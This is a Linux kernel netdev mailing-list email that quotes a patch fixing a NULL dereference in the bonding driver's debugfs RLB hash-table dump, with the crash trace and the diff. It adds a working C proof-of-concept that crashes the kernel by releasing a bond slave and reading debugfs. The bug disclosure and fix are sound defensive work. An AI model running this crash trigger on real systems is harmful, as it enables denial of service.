Return-Path: <netdev+bounces-267957-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id QG3tAFQNt2k4MAEAu9opvQ
	(envelope-from <netdev+bounces-267957-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Sun, 15 Mar 2026 20:49:40 +0100
X-Original-To: lists+netdev@lfdr.de
Received: from sto.lore.kernel.org (sto.lore.kernel.org [IPv6:2600:3c09:e001:a7::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 960B1292424
	for <lists+netdev@lfdr.de>; Sun, 15 Mar 2026 20:49:39 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sto.lore.kernel.org (Postfix) with ESMTP id ED7AB3004D23
	for <lists+netdev@lfdr.de>; Sun, 15 Mar 2026 19:49:38 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id EE4DD361DA6;
	Sun, 15 Mar 2026 19:49:35 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="W8FRk12C"
X-Original-To: netdev@vger.kernel.org
Received: from mail-dy1-f182.google.com (mail-dy1-f182.google.com [74.125.82.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2E62734DB7E
	for <netdev@vger.kernel.org>; Sun, 15 Mar 2026 19:49:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1773604175; cv=none; b=qWxbnQRm8Ex9FOQEgO8RGCpV2YM/ISIxIaX39iMaLzuGR2rsQCIeSnXMboL76wgXWJS0JdKAxs54X+4OJJdFDraZWlOs0psN031jXi0OlbBHFVIqW9jtegIK01UOUhavTsJCdKrea1XPLdY+LTDhrKONfoEVZmlUOgQndSeKLec=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1773604175; c=relaxed/simple;
	bh=awDdGG+ZzXIvv1H32u3hYjz8jJvHkELUxfq/yZIxqNY=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=k2agpkGz+Gah2GCDsGJytfmcAljN9Bfk35HaNlapioP0pXjJiMgixHnwRuGkESB00zX3VZOudKNTi7H9P0jcOAmHLvuE3H9/LYqElwPoht2cDymaSlpmqCs9523lUBsi4IuRFDFB2Ktwd9N0dE4I9IDBlfoKe7VuseyRjvPVJT4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=W8FRk12C; arc=none smtp.client-ip=74.125.82.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-dy1-f182.google.com with SMTP id 5a478bee46e88-2beb0246931so3608069eec.0
        for <netdev@vger.kernel.org>; Sun, 15 Mar 2026 12:49:33 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1773604173; x=1774208973; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=NwosIhn+Fk49wWLN4quC4PxUaiBQwd7RUfWVmpTLG90=;
        b=W8FRk12C7U5fydBh2VkZyJplheCMYZYWsmTdDPnCP6dx/zObHv1mPQtGS9cL2AvkRk
         MCK77UlGEzH25j+vW32mpDOz0CMGzklvBYuL0PBn7L5UEU12xuV2ZpfNlqRFsfbSvZMy
         zIqJMVAk5edtb3j3m1QqzkCFCdoLwvBT+aB1wAjFhQqew+/RFxIPtsuTPb/ZfvLOOMGt
         ail5cedhOuJi8eMlx69gMU6W7quE6orqcSHOuAumw731Q4OIZYW1nBn1j9NAc3RVBl2v
         081rIl8jC3gAhsZs9kN5ZSV+Z2doRZXLjruzf0nGnXY3AEqjrFQYRWr5gr1NVtdads0j
         0XpA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1773604173; x=1774208973;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=NwosIhn+Fk49wWLN4quC4PxUaiBQwd7RUfWVmpTLG90=;
        b=Agi5iUQMFzB1Tne96Z7WvS0RR0/sltU7lWD4Nj/VQsVjs8zXn5pvss0E1RcRrxmAo+
         bcMIu0NYAHRNISEedZDTnX468uQ+1HhRnHdeZIOkdH/oqit/7pitH6CaO/G3lVYiYxY+
         jsk3yQVLdfgqTRfLY0vzkf0KIf5JPM065RadIZIMcldqSlu9ybDjm5jf6iF6qF7MHesd
         T91fVOzzs+YZ42LUFsXN7owT4LUB2dhYQTTEWdjNjHnSX6GLOjAAL8bhxwd2Xf7+sEpG
         FKVJy+Xe2/dviYpENZs8f7Cod2+8lGNPr0CAWpaJo2Ok+uhVTXsQeOuY4j7Mp0VPM63t
         rTgw==
X-Gm-Message-State: AOJu0YxP65Lw1VxEmqPK+9ubYpps9oHrB6GmpXYCYQQlILvIm0VeV2GV
	o+BRzNYaB31Z38IA/bzWZmITqBEIJzxazEhvs7A4aBdAY1fFig56cb4SShfGSVzN9kN/8QG+HNB
	YtjY=
X-Gm-Gg: ATEYQzw3v+8hd0Ox7a5zc6E4jky2AnHMsqQjkU4AK3Qa92v64JbQCmOKIbSWdHlSW4j
	LwAm7/rPYsOePuqwCdwSnDXO4wzQXnO6pJ8Zfn2P5rOb3UDaEdLUotT22yJrWgaLz22+PL1OhFz
	nfNUN3f0cMXyhLd7mghQmIFzdPM3xM3nAOX6JQuv/Ko1VdaOfGgPrZyLAs3AwNsJW6q9uT7jTeE
	Sd80/WrKXQm8ApcSKuW1+qbB0sx/Uiylk7/vxNl/dPVbYVo7UCF1g5JDFbA1SQltO+iDAgKDrMg
	Xw3gkFqfNEu0+Y+9qoy+mdkplU0jUD5YNYPC9OMA19U+HCG6S9wx36+b5uWAKkwG1d81piPWBB6
	dJny3nO4A1vCdgPKgOFhbuXzHiIkplNjNIxCb46n8NlYPDmFg4LgHCXD7rL/7dbLwS8qLVFaKD1
	4SbsE5DjlMMsG0XnWkhtnzbw0VYtS0TA==
X-Received: by 2002:a05:7300:238e:b0:2bd:b961:7e8b with SMTP id 5a478bee46e88-2bea5523ea8mr4599137eec.24.1773604172988;
        Sun, 15 Mar 2026 12:49:32 -0700 (PDT)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-2c0b3f02ee3sm5387953eec.16.2026.03.15.12.49.32
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 15 Mar 2026 12:49:32 -0700 (PDT)
Date: Sun, 15 Mar 2026 12:49:31 -0700
From: Xiang Mei <xmei5@asu.edu>
To: netdev@vger.kernel.org
Cc: jv@jvosburgh.net, andrew+netdev@lunn.ch, davem@davemloft.net, 
	edumazet@google.com, kuba@kernel.org, pabeni@redhat.com, bestswngs@gmail.com
Subject: Re: [PATCH net] net: bonding: fix NULL deref in
 bond_debug_rlb_hash_show
Message-ID: <z4qkq7tqsq3654exj7chld6zof5lqwbjish4lawzhcsn7zshjv@mi3qxbw572ld>
References: <20260315194404.579122-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260315194404.579122-1-xmei5@asu.edu>
X-Spamd-Result: default: False [-0.16 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	MID_RHS_NOT_FQDN(0.50)[];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c09:e001:a7::/64];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-267957-lists,netdev=lfdr.de];
	FREEMAIL_CC(0.00)[jvosburgh.net,lunn.ch,davemloft.net,google.com,kernel.org,redhat.com,gmail.com];
	MISSING_XM_UA(0.00)[];
	FROM_HAS_DN(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	ASN(0.00)[asn:63949, ipnet:2600:3c09::/32, country:SG];
	TO_DN_NONE(0.00)[];
	RCPT_COUNT_SEVEN(0.00)[8];
	NEURAL_HAM(-0.00)[-1.000];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	MIME_TRACE(0.00)[0:+]
X-Rspamd-Queue-Id: 960B1292424
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Sun, Mar 15, 2026 at 12:44:04PM -0700, Xiang Mei wrote:
> rlb_clear_slave intentionally keeps RLB hash-table entries on
> the rx_hashtbl_used_head list with slave set to NULL when no
> replacement slave is available. However, bond_debug_rlb_hash_show
> visites client_info->slave without checking if it's NULL.
> 
> Other used-list iterators in bond_alb.c already handle this NULL-slave
> state safely:
> 
> - rlb_update_client returns early on !client_info->slave
> - rlb_req_update_slave_clients, rlb_clear_slave, and rlb_rebalance
> compare slave values before visiting
> - lb_req_update_subnet_clients continues if slave is NULL
> 
> The following NULL deref crash can be trigger in
> bond_debug_rlb_hash_show:
> 
> [    1.289791] BUG: kernel NULL pointer dereference, address: 0000000000000000
> [    1.290262] #PF: supervisor read access in kernel mode
> [    1.290494] #PF: error_code(0x0000) - not-present page
> [    1.290724] PGD 102a98067 P4D 102a98067 PUD 102831067 PMD 0
> [    1.291013] Oops: Oops: 0000 [#1] SMP NOPTI
> [    1.291202] CPU: 1 UID: 0 PID: 145 Comm: exploit Not tainted 7.0.0-rc3-virtme #1 PREEMPTLAZY
> [    1.291555] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.or4
> [    1.292058] RIP: 0010:bond_debug_rlb_hash_show (drivers/net/bonding/bond_debugfs.c:41)
> [    1.292286] Code: 83 fb ff 74 3c 48 c1 e3 06 49 03 9c 24 f0 00 00 00 48 c7 c6 d5 aa 9d 83 48 89 ef 48 8b 43 30 48 85
> 
> Code starting with the faulting instruction
> ===========================================
>    0:	83 fb ff             	cmp    $0xffffffff,%ebx
>    3:	74 3c                	je     0x41
>    5:	48 c1 e3 06          	shl    $0x6,%rbx
>    9:	49 03 9c 24 f0 00 00 	add    0xf0(%r12),%rbx
>   10:	00
>   11:	48 c7 c6 d5 aa 9d 83 	mov    $0xffffffff839daad5,%rsi
>   18:	48 89 ef             	mov    %rbp,%rdi
>   1b:	48 8b 43 30          	mov    0x30(%rbx),%rax
>   1f:	48                   	rex.W
>   20:	85                   	.byte 0x85
> [    1.293101] RSP: 0018:ffffc900004a7d00 EFLAGS: 00010286
> [    1.293333] RAX: 0000000000000000 RBX: ffff888102b48200 RCX: ffff888102b48204
> [    1.293631] RDX: ffff888102b48200 RSI: ffffffff839daad5 RDI: ffff888102815078
> [    1.293924] RBP: ffff888102815078 R08: ffff888102b4820e R09: 0000000000000000
> [    1.294267] R10: 0000000000000000 R11: 0000000000000000 R12: ffff888100f929c0
> [    1.294564] R13: ffff888100f92a00 R14: 0000000000000001 R15: ffffc900004a7ed8
> [    1.294864] FS:  0000000001395380(0000) GS:ffff888196e75000(0000) knlGS:0000000000000000
> [    1.295239] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [    1.295480] CR2: 0000000000000000 CR3: 0000000102adc004 CR4: 0000000000772ef0
> [    1.295775] PKRU: 55555554
> [    1.295897] Call Trace:
> [    1.296031]  <TASK>
> [    1.296134]  seq_read_iter (fs/seq_file.c:231)
> [    1.296341]  seq_read (fs/seq_file.c:164)
> [    1.296493]  full_proxy_read (fs/debugfs/file.c:378 (discriminator 1))
> [    1.296658]  vfs_read (fs/read_write.c:572)
> [    1.296804]  ? _raw_spin_unlock (./arch/x86/include/asm/paravirt-spinlock.h:40 ./arch/x86/include/asm/paravirt-spinlock.h:72 ./include/linux/spinlock.h:204 ./include/linux/spinlock_api_smp.h:168 kernel/locking/spinlock.c:186)
> [    1.296981]  ksys_read (fs/read_write.c:717)
> [    1.297132]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 (discriminator 1) arch/x86/entry/syscall_64.c:94 (discriminator 1))
> [    1.297325]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:130)
> [    1.297553] RIP: 0033:0x41c9d1
> [    1.297693] Code: f7 d8 64 89 02 b8 ff ff ff ff eb ba e8 f8 14 00 00 0f 1f 84 00 00 00 00 00 f3 0f 1e fa 80 3d 8d 9c
> 
> Code starting with the faulting instruction
> ===========================================
>    0:	f7 d8                	neg    %eax
>    2:	64 89 02             	mov    %eax,%fs:(%rdx)
>    5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
>    a:	eb ba                	jmp    0xffffffffffffffc6
>    c:	e8 f8 14 00 00       	call   0x1509
>   11:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
>   18:	00
>   19:	f3 0f 1e fa          	endbr64
>   1d:	80                   	.byte 0x80
>   1e:	3d                   	.byte 0x3d
>   1f:	8d                   	.byte 0x8d
>   20:	9c                   	pushf
> [    1.298516] RSP: 002b:00007ffdd99e07d8 EFLAGS: 00000246 ORIG_RAX: 0000000000000000
> [    1.298834] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 000000000041c9d1
> [    1.299163] RDX: 0000000000001000 RSI: 00007ffdd99e07f0 RDI: 0000000000000003
> [    1.299483] RBP: 00007ffdd99e1800 R08: 00007ffdd99e0740 R09: 0000000000000014
> [    1.299786] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffdd99e1918
> [    1.300106] R13: 00007ffdd99e1928 R14: 00000000004b0868 R15: 0000000000000001
> [    1.300419]  </TASK>
> [    1.300523] Modules linked in:
> [    1.300667] CR2: 0000000000000000
> [    1.300820] ---[ end trace 0000000000000000 ]---
> 
> Add a NULL check and print "(none)" for entries with no assigned slave.
> 
> Fixes: caafa84251b88 ("bonding: add the debugfs interface to see RLB hash table")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  drivers/net/bonding/bond_debugfs.c | 16 +++++++++++-----
>  1 file changed, 11 insertions(+), 5 deletions(-)
> 
> diff --git a/drivers/net/bonding/bond_debugfs.c b/drivers/net/bonding/bond_debugfs.c
> index 8adbec7c5084..8967b65f6d84 100644
> --- a/drivers/net/bonding/bond_debugfs.c
> +++ b/drivers/net/bonding/bond_debugfs.c
> @@ -34,11 +34,17 @@ static int bond_debug_rlb_hash_show(struct seq_file *m, void *v)
>  	for (; hash_index != RLB_NULL_INDEX;
>  	     hash_index = client_info->used_next) {
>  		client_info = &(bond_info->rx_hashtbl[hash_index]);
> -		seq_printf(m, "%-15pI4 %-15pI4 %-17pM %s\n",
> -			&client_info->ip_src,
> -			&client_info->ip_dst,
> -			&client_info->mac_dst,
> -			client_info->slave->dev->name);
> +		if (client_info->slave)
> +			seq_printf(m, "%-15pI4 %-15pI4 %-17pM %s\n",
> +				   &client_info->ip_src,
> +				   &client_info->ip_dst,
> +				   &client_info->mac_dst,
> +				   client_info->slave->dev->name);
> +		else
> +			seq_printf(m, "%-15pI4 %-15pI4 %-17pM (none)\n",
> +				   &client_info->ip_src,
> +				   &client_info->ip_dst,
> +				   &client_info->mac_dst);
>  	}
>  
>  	spin_unlock_bh(&bond->mode_lock);
> -- 
> 2.43.0
>

Thanks for your attention to this bug. It's a NULL-deref can only be
triggered by privileged users.

The following information could help you to reproduce the bug:

1) The required configs:

```
scripts/config -d CONFIG_NET_NS
scripts/config -e CONFIG_DEBUG_FS
```

2) poc source code

```c
/*
 * PoC: NULL deref in bond_debug_rlb_hash_show()
 *
 * 1. Create balance-alb bond with dummy0 slave
 * 2. Send ARP to populate RLB hash entry
 * 3. Release slave -> rlb_clear_slave() sets entry->slave = NULL
 * 4. Read debugfs rlb_hash_table -> NULL deref
 *
 */
#include <arpa/inet.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <unistd.h>

#define DIE(msg) do { perror(msg); exit(1); } while (0)

static void sysfs_write(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) DIE(path);
	write(fd, val, strlen(val));
	close(fd);
}

static void if_updown(const char *ifname, int up)
{
	struct ifreq ifr = {};
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFFLAGS, &ifr);
	if (up) ifr.ifr_flags |= IFF_UP;
	else    ifr.ifr_flags &= ~IFF_UP;
	ioctl(fd, SIOCSIFFLAGS, &ifr);
	close(fd);
}

static void send_arp(const char *ifname)
{
	struct ifreq ifr = {};
	unsigned char mac[ETH_ALEN];
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	ioctl(fd, SIOCGIFINDEX, &ifr);
	int idx = ifr.ifr_ifindex;
	close(fd);

	struct {
		unsigned char dst[6], src[6];
		uint16_t proto, htype, ptype;
		uint8_t hlen, plen;
		uint16_t oper;
		unsigned char sha[6], spa[4], tha[6], tpa[4];
	} __attribute__((packed)) pkt = {};

	memset(pkt.dst, 0xff, 6);
	memcpy(pkt.src, mac, 6);
	pkt.proto = htons(ETH_P_ARP);
	pkt.htype = htons(ARPHRD_ETHER);
	pkt.ptype = htons(ETH_P_IP);
	pkt.hlen = 6; pkt.plen = 4;
	pkt.oper = htons(ARPOP_REQUEST);
	memcpy(pkt.sha, mac, 6);
	inet_pton(AF_INET, "10.0.0.1", pkt.spa);
	inet_pton(AF_INET, "10.0.0.2", pkt.tpa);

	struct sockaddr_ll sll = {
		.sll_family = AF_PACKET,
		.sll_protocol = htons(ETH_P_ARP),
		.sll_ifindex = idx,
		.sll_halen = 6,
	};
	memset(sll.sll_addr, 0xff, 6);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (fd < 0) DIE("socket(AF_PACKET)");
	sendto(fd, &pkt, sizeof(pkt), 0, (void *)&sll, sizeof(sll));
	close(fd);
}

int main(void)
{
	mount("debugfs", "/sys/kernel/debug", "debugfs", 0, NULL);

	/* Step 1: create balance-alb bond with dummy0 */
	sysfs_write("/sys/class/net/bonding_masters", "+bond0");
	usleep(100000);
	sysfs_write("/sys/class/net/bond0/bonding/mode", "balance-alb");
	if_updown("dummy0", 0);
	sysfs_write("/sys/class/net/bond0/bonding/slaves", "+dummy0");
	if_updown("dummy0", 1);
	if_updown("bond0", 1);
	usleep(100000);

	/* Step 2: populate RLB hash entry via ARP */
	send_arp("bond0");
	usleep(300000);

	/* Step 3: release slave -> entry->slave = NULL */
	sysfs_write("/sys/class/net/bond0/bonding/slaves", "-dummy0");
	usleep(300000);

	/* Step 4: trigger NULL deref */
	char buf[4096];
	int fd = open("/sys/kernel/debug/bonding/bond0/rlb_hash_table", O_RDONLY);
	if (fd < 0) DIE("open(debugfs)");
	read(fd, buf, sizeof(buf));
	close(fd);

	return 0;
}
```


The intended crash was attached in the commit message. Please let me know
if you have any questions for the patch and poc.

Thanks,
Xiang


